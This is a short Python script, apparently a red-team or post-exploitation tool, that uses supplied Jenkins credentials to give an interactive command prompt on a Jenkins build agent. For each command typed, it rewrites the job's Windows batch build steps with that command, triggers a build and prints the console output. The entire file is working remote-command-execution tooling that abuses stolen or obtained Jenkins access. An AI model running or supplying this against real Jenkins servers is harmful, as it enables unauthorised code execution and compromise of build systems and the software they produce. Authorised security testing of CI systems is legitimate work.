import jenkins
import xml.etree.ElementTree as ET
import argparse
import time

timeout = 300
rest = 10

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True)
parser.add_argument("--user", required=True)
parser.add_argument("--token", required=True)
parser.add_argument("--job", required=True)
parser.add_argument("--buildtoken", required=True)
args = parser.parse_args()

# let's connect the servaaaahhh
server = jenkins.Jenkins(args.url, username=args.user, password=args.token)
print("Conected[+]")
while True:
	command = input("shell or exit>").strip()
	if command.lower() == "exit":
		print("Jaa raha hu 😔")
		break
	if not command:
		continue
	
	# Config new wali
	gubh = ET.fromstring(server.get_job_config(args.job))
	batch_nodes = gubh.findall(".//hudson.tasks.BatchFile/command")
	if not batch_nodes:
		print("Did not find batchfile in your job config")
		continue
	for node in batch_nodes:
		node.text = command
	server.reconfig_job(args.job, ET.tostring(gubh, encoding="unicode"))
	print("Updated the config")
	
	# triggering the build now
	queue = server.build_job(args.job, token=args.buildtoken)
	print("[+]Executing the command")
	buildnum = None
	deadline = time.time() + timeout
	while time.time() < deadline:
		queue_info = server.get_queue_item(queue)
		if "executable" in queue_info:
			buildnum = queue_info["executable"]["number"]
			break
		print(f"Still qued {queue_info.get('why', 'queued')}")
		time.sleep(rest)
	else:
		print("Time Out HOgya yawrr")
		continue
		# Build khatam kab hoga arghhhhh
	while time.time() < deadline:
		build_info = server.get_build_info(args.job, buildnum)
		if not build_info["building"]:
			print(f"[+] Build #{buildnum} done: {build_info['result']}")
			break
		print(f"Still running bhai... ({build_info['duration'] / 1000:.0f}s)")
		time.sleep(rest)
	else:
		print(f"Timeout hogya build #{buildnum} ke liye yawrr 😔")
		continue

# Hopefully Output aajaye 
	console = server.get_build_console_output(args.job, buildnum)
	lines = console.splitlines()
	skip_prefixes = ("Started by", "Running as ", "Building in workspace", "Finished:", "[EnvInject]", "[workspace]")
	output = [l for l in lines if not any(l.startswith(p) for p in skip_prefixes)]
	print("\n" + "─" * 50)
	print(f"Output of {args.job} #{buildnum}:")
	print("─" * 50)
	print("\n".join(output).strip())
	print("─" * 50)